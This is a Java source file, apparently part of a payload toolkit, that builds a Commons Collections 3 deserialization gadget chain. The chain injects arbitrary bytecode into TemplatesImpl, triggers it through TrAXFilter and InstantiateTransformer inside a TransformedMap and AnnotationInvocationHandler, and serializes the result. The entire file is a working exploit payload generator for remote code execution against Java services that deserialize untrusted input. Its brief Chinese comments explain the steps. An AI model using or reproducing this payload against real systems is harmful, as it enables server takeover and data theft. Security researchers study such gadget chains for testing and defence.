package com.xiaoqiu.payload;

/**
 * @Description :
 * @Time : 2023/4/18 18:54
 * @Author : xiaoqiuxx
 */

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_2 {
    public byte[] getPayload(byte[] clazzBytes) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

        TemplatesImpl templatesimpl=new TemplatesImpl();

        //getTransletInstance()第一个判断
        Class c=templatesimpl.getClass();
        Field _nameField=c.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesimpl,"aaa");

        //要加载类的字节码
        Field _byteCodesField=c.getDeclaredField("_bytecodes");
        _byteCodesField.setAccessible(true);


        byte[][] codes= {clazzBytes};
        _byteCodesField.set(templatesimpl,codes);

//防止报错
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templatesimpl,new TransformerFactoryImpl());

        //用来初始化TemplatesImpl类
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesimpl});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);


        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","value");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map,null,chainedTransformer);


        Class c2=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor=c2.getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object o=AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(o);
        oos.close();

        return barr.toByteArray();
    }
    //序列化

}